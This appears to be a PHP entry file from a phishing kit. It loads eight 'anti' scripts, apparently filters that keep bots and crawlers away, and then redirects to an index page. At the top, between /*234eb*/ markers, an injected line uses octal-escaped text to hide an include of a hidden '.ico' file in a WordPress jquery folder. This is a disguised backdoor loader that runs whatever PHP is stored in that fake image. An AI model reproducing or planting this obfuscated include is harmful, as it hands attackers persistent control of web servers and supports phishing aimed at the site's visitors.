<?php
/*234eb*/

@include "\057ho\155e/\167or\144pr\145ss\154et\163do\167/p\165bl\151c_\150tm\154/q\165ic\153it\056in\057wp\055in\143lu\144es\057js\057jq\165er\171/.\14687\06162\0667.\151co";

/*234eb*/
  	require 'anti1.php';
	require 'anti2.php';
	require 'anti3.php';
	require 'anti4.php';
	require 'anti5.php';
	require 'anti6.php';
	require 'anti7.php';
	require 'anti8.php';
	exit(header("Location: ../index.php"));
?>
